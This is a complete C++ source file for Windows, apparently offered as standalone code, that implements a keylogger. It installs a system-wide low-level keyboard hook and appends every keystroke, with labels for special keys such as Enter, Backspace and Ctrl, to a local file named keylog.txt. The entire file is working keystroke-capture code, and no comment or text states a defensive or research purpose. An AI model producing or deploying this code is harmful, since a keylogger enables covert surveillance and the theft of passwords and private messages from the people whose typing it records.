#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>

std::ofstream logFile;
std::string logFileName = "keylog.txt";

void OpenLogFile() {
    logFile.open(logFileName, std::ios_base::app);
    if (!logFile.is_open()) {
        MessageBoxA(NULL, "Failed to open log file", "Error", MB_OK | MB_ICONERROR);
        exit(1);
    }
}

void WriteKeyToLog(const char* key) {
    if (logFile.is_open()) {
        logFile << key;
        logFile.flush();
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            switch (pKeyBoard->vkCode) {
                case VK_RETURN:
                    WriteKeyToLog("\n[ENTER]\n");
                    break;
                case VK_BACK:
                    WriteKeyToLog("[BACKSPACE]");
                    break;
                case VK_TAB:
                    WriteKeyToLog("[TAB]");
                    break;
                case VK_ESCAPE:
                    WriteKeyToLog("[ESCAPE]");
                    break;
                case VK_CAPITAL:
                    WriteKeyToLog("[CAPSLOCK]");
                    break;
                case VK_SPACE:
                    WriteKeyToLog(" ");
                    break;
                case VK_SHIFT:
                    WriteKeyToLog("[SHIFT]");
                    break;
                case VK_CONTROL:
                    WriteKeyToLog("[CTRL]");
                    break;
                case VK_MENU:
                    WriteKeyToLog("[ALT]");
                    break;
                case VK_LEFT:
                    WriteKeyToLog("[LEFT]");
                    break;
                case VK_RIGHT:
                    WriteKeyToLog("[RIGHT]");
                    break;
                case VK_UP:
                    WriteKeyToLog("[UP]");
                    break;
                case VK_DOWN:
                    WriteKeyToLog("[DOWN]");
                    break;
                default:
                    char key[2];
                    if (GetKeyState(VK_CAPITAL) & 0x0001) {
                        key[0] = (char)MapVirtualKeyA(pKeyBoard->vkCode, MAPVK_VK_TO_CHAR);
                    } else {
                        key[0] = tolower((char)MapVirtualKeyA(pKeyBoard->vkCode, MAPVK_VK_TO_CHAR));
                    }
                    key[1] = '\0';
                    WriteKeyToLog(key);
                    break;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    OpenLogFile();
    
    HHOOK keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        MessageBoxA(NULL, "Failed to set keyboard hook", "Error", MB_OK | MB_ICONERROR);
        logFile.close();
        return 1;
    }
    
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    
    UnhookWindowsHookEx(keyboardHook);
    logFile.close();
    
    return 0;
}